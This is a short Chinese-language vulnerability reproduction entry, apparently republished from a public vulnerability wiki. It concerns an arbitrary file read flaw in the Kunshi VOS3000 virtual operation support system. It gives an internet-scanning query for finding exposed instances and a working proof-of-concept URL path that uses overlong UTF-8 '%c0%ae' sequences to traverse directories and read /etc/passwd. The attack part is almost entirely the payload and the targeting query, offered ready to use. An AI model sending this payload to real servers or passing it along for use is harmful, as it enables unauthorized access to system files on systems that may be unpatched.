---
title: "昆石网络 VOS3000虚拟运营支撑系统 %c0%ae%c0%ae 任意文件读取漏洞"
date: 2026-10-16 09:10:46
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "昆石网络"
tags:
  - "昆石网络"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

昆石网络 VOS3000虚拟运营支撑系统 通过 %c0%ae%c0%ae 等字符绕过检测，可导致任意文件读取漏洞

## 漏洞影响

```
昆石网络 VOS3000虚拟运营支撑系统
```

## 网络测绘

```
app="VOS-VOS3000"
```

## 漏洞复现

登录页面

![image-20220525144202606](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251442673.png)

验证POC

```
/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251443278.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%98%86%E7%9F%B3%E7%BD%91%E7%BB%9C-VOS3000%E8%99%9A%E6%8B%9F%E8%BF%90%E8%90%A5%E6%94%AF%E6%92%91%E7%B3%BB%E7%BB%9F-%25c0%25ae%25c0%25ae-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
